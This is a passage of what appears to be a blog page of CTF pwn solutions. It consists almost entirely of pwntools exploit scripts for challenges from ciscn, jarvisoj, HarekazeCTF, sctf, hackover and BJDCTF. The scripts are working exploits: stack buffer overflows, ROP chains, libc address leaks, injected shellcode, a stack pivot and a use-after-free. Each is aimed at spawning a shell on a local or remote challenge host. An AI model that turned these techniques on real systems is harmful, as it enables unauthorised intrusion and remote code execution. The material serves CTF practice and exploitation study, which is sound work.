0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ciscn_2019_n_5&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27053)</span><br><span class="line">#elf &#x3D; ELF(&#39;&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line"></span><br><span class="line">name_addr &#x3D; 0x00601080</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendafter(&#39;tell me your name&#39;,shellcode+&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x20+8) + p64(name_addr)</span><br><span class="line">p.sendafter(&#39;What do you want to say to me?&#39;,payload+&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-20-ciscn-2019-s-3-sovle"><a href="#NO-20-ciscn-2019-s-3-sovle" class="headerlink" title="NO.20 ciscn_2019_s_3_sovle"></a>NO.20 ciscn_2019_s_3_sovle</h1><h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ciscn_2019_s_3&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,25585)</span><br><span class="line">elf &#x3D; ELF(&#39;ciscn_2019_s_3&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line"></span><br><span class="line">main &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line">#main&#x3D;0x0004004ED</span><br><span class="line">execv &#x3D; 0x04004E2</span><br><span class="line">pop_rdi &#x3D; 0x4005a3</span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15 &#x3D; 0x40059A</span><br><span class="line">mov_rdxr13_call &#x3D; 0x0400580 </span><br><span class="line">syscall &#x3D; 0x00400517</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\00&#39;*2 + p64(main)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(0x20)</span><br><span class="line">binsh_addr &#x3D; u64(p.recv(8)) - 0x138</span><br><span class="line">print(hex(binsh_addr))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\00&#39;*2 + p64(pop_rbx_rbp_r12_r13_r14_r15) </span><br><span class="line">payload +&#x3D; p64(0)+p64(0)+p64(binsh_addr+0x50)</span><br><span class="line">payload +&#x3D; p64(0)+p64(0)+p64(0)</span><br><span class="line">payload +&#x3D; p64(mov_rdxr13_call)+p64(execv)</span><br><span class="line">payload +&#x3D; p64(pop_rdi)+p64(binsh_addr)+p64(syscall)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-21-jarvisoj-level2-x64-sovle"><a href="#NO-21-jarvisoj-level2-x64-sovle" class="headerlink" title="NO.21 jarvisoj_level2_x64_sovle"></a>NO.21 jarvisoj_level2_x64_sovle</h1><h3 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;jarvisoj_level2_x64&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27721)</span><br><span class="line">#elf &#x3D; ELF(&#39;&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x00000000004006b3</span><br><span class="line">system_addr &#x3D; 0x040063E</span><br><span class="line"></span><br><span class="line">system_addr1 &#x3D; 0x004004C0</span><br><span class="line">binsh_addr &#x3D; 0x0600A90</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x80+8)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-22-HarekazeCTF2019-baby-rop2-sovle"><a href="#NO-22-HarekazeCTF2019-baby-rop2-sovle" class="headerlink" title="NO.22 HarekazeCTF2019_baby_rop2_sovle"></a>NO.22 HarekazeCTF2019_baby_rop2_sovle</h1><h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;[HarekazeCTF2019]baby_rop2&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29812)</span><br><span class="line">elf &#x3D; ELF(&#39;[HarekazeCTF2019]baby_rop2&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">main &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">read_plt &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line">printf_plt &#x3D; elf.plt[&#39;printf&#39;]</span><br><span class="line">printf_got &#x3D; elf.got[&#39;printf&#39;]</span><br><span class="line">format_str&#x3D;0x400770  #%s</span><br><span class="line">pop_rdi &#x3D; 0x0000000000400733</span><br><span class="line">pop_rsi_r15 &#x3D; 0x0000000000400731</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x28) +p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;? &#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">read_addr &#x3D; u64(p.recvuntil(&quot;\x7f&quot;).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(read_addr)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;read&#39;,read_addr)</span><br><span class="line">offset &#x3D; read_addr - libc.dump(&#39;read&#39;)</span><br><span class="line">system &#x3D; offset + libc.dump(&#39;system&#39;)</span><br><span class="line">binsh &#x3D; offset + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">offset &#x3D; read_addr - libc.sym[&#39;read&#39;]</span><br><span class="line">system &#x3D; libc.sym[&#39;system&#39;] + offset</span><br><span class="line">binsh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()+offset</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x28)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.recvuntil(&#39;? &#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-23-ciscn-2019-ne-5-sovle"><a href="#NO-23-ciscn-2019-ne-5-sovle" class="headerlink" title="NO.23 ciscn_2019_ne_5_sovle"></a>NO.23 ciscn_2019_ne_5_sovle</h1><h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ciscn_2019_ne_5&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,25921)</span><br><span class="line">elf &#x3D; ELF(&#39;ciscn_2019_ne_5&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line"></span><br><span class="line">system &#x3D; elf.plt[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">sh_addr &#x3D; 0x080482EA</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x48+4)+p32(system)+p32(0xdeadbeef)+p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Please input admin password:&#39;)</span><br><span class="line">p.sendline(&#39;administrator&#39;)</span><br><span class="line">p.recvuntil(&#39;0.Exit\n&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.recvuntil(&#39;:&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;0.Exit\n&#39;)</span><br><span class="line">p.sendline(&#39;4&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-24-pwn2-sctf-2016-sovle"><a href="#NO-24-pwn2-sctf-2016-sovle" class="headerlink" title="NO.24 pwn2_sctf_2016_sovle"></a>NO.24 pwn2_sctf_2016_sovle</h1><h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;pwn2_sctf_2016&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26427)</span><br><span class="line">elf &#x3D; ELF(&#39;pwn2_sctf_2016&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc&#x2F;ubuntu16&#x2F;32&#x2F;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">atoi_got &#x3D; elf.got[&#39;atoi&#39;]</span><br><span class="line">printf_plt &#x3D; elf.plt[&#39;printf&#39;]</span><br><span class="line">printf_got &#x3D; elf.got[&#39;printf&#39;]</span><br><span class="line">main_addr &#x3D; elf.symbols[&#39;main&#39;]</span><br><span class="line">format_addr &#x3D; 0x080486F8</span><br><span class="line"></span><br><span class="line">def send(payload):</span><br><span class="line">p.recvuntil(&#39;How many bytes do you want me to read? &#39;)</span><br><span class="line">p.sendline(str(-1))</span><br><span class="line">p.recvuntil(&#39;data!\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x2c+4)+p32(printf_plt)+p32(main_addr)+p32(format_addr)+p32(atoi_got)</span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;You said: &#39;)</span><br><span class="line">p.recvuntil(&#39;You said: &#39;)</span><br><span class="line">atoi_addr &#x3D; u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">offset &#x3D;  atoi_addr - libc.sym[&#39;atoi&#39;]</span><br><span class="line">system &#x3D; libc.sym[&#39;system&#39;]+offset</span><br><span class="line">binsh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()+offset</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x2c+4)+p32(system)+p32(0xdeefdedf)+p32(binsh)</span><br><span class="line">send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-25-ez-pz-hackover-2016-sovle"><a href="#NO-25-ez-pz-hackover-2016-sovle" class="headerlink" title="NO.25 ez_pz_hackover_2016_sovle"></a>NO.25 ez_pz_hackover_2016_sovle</h1><h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;i386&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ez_pz_hackover_2016&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29304)</span><br><span class="line">#elf &#x3D; ELF(&#39;ez_pz_hackover_2016&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Yippie, lets crash: &#39;)</span><br><span class="line">s_addr &#x3D; int(p.recv(10), 16)</span><br><span class="line">p.recvuntil(&#39;&gt; &#39;)</span><br><span class="line"></span><br><span class="line">#print(hex(s_addr))</span><br><span class="line">payload &#x3D; &#39;crashme\x00&#39;+&#39;\x00&#39;*(26-8)+p32(s_addr-0x1c) + asm(shellcraft.sh())</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-26-ciscn-2019-es-2-sovle"><a href="#NO-26-ciscn-2019-es-2-sovle" class="headerlink" title="NO.26 ciscn_2019_es_2_sovle"></a>NO.26 ciscn_2019_es_2_sovle</h1><h3 id="exp-26"><a href="#exp-26" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;i386&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ciscn_2019_es_2&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26426)</span><br><span class="line">elf &#x3D; ELF(&#39;ciscn_2019_es_2&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_plt &#x3D; elf.plt[&#39;system&#39;]</span><br><span class="line">vuln &#x3D; 0x08048595</span><br><span class="line">hack &#x3D; 0x0804854B</span><br><span class="line">leave &#x3D; 0x080484B8</span><br><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">payload &#x3D; payload.ljust(0x27,&#39;a&#39;) </span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(0x2f)</span><br><span class="line">ebp_addr &#x3D; u32(p.recv(4)) - 0x38</span><br><span class="line"></span><br><span class="line">print &quot;ebd_addr &#x3D;&gt;&quot; , hex(ebp_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;bbbb&#39;+ p32(system_plt) +&#39;cccc&#39;+p32(ebp_addr+0x10)+&#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">payload &#x3D; payload.ljust(0x28,&#39;d&#39;)</span><br><span class="line">payload +&#x3D; p32(ebp_addr)+p32(leave)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-27-jarvisoj-level3-sovle"><a href="#NO-27-jarvisoj-level3-sovle" class="headerlink" title="NO.27 jarvisoj_level3_sovle"></a>NO.27 jarvisoj_level3_sovle</h1><h3 id="exp-27"><a href="#exp-27" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;jarvisoj_level3&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28355)</span><br><span class="line">elf &#x3D; ELF(&#39;jarvisoj_level3&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">main &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88+4)+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#print hex(len(payload))</span><br><span class="line">p.recvuntil(&#39;Input:\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr &#x3D; u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">#print hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line"></span><br><span class="line">offset &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">system &#x3D; libc.dump(&#39;system&#39;) + offset</span><br><span class="line">binsh &#x3D; libc.dump(&#39;str_bin_sh&#39;) + offset</span><br><span class="line">payload  &#x3D; &#39;a&#39;*(0x88+4)+p32(system)+p32(main)+p32(binsh)</span><br><span class="line">p.recvuntil(&#39;\n&#39;) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-28-BJDCTF2nd-ydsneedgirlfriend2-sovle"><a href="#NO-28-BJDCTF2nd-ydsneedgirlfriend2-sovle" class="headerlink" title="NO.28 BJDCTF2nd_ydsneedgirlfriend2_sovle"></a>NO.28 BJDCTF2nd_ydsneedgirlfriend2_sovle</h1><h3 id="exp-28"><a href="#exp-28" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;[BJDCTF 2nd]ydsneedgirlfriend2&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26424)</span><br><span class="line">elf &#x3D; ELF(&#39;[BJDCTF 2nd]ydsneedgirlfriend2&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">def add(size,context):</span><br><span class="line">    p.recvuntil(&quot;u choice :\n&quot;)</span><br><span class="line">    p.sendline(str(1))</span><br><span class="line">    p.recvuntil(&quot;Please input the length of her name:\n&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;Please tell me her name:\n&quot;)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.recvuntil(&quot;u choice :\n&quot;)</span><br><span class="line">    p.sendline(str(2))</span><br><span class="line">    p.recvuntil(&quot;Index :&quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.recvuntil(&quot;u choice :\n&quot;)</span><br><span class="line">    p.sendline(str(3))</span><br><span class="line">    p.recvuntil(&quot;Index :&quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor &#x3D; 0x400D86</span><br><span class="line"></span><br><span class="line">add(0x20,&quot;a&quot;*0x10)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(0x10,p64(0)+p64(backdoor))</span><br><span class="line">show(0)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-29-jarvisoj-fm-sovle"><a href="#NO-29-jarvisoj-fm-sovle" class="headerlink" title="NO.29 jarvisoj_fm_sovle"></a>NO.29 jarvisoj_fm_sovle</h1><h3 id="exp-29"><a href="#exp-29" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 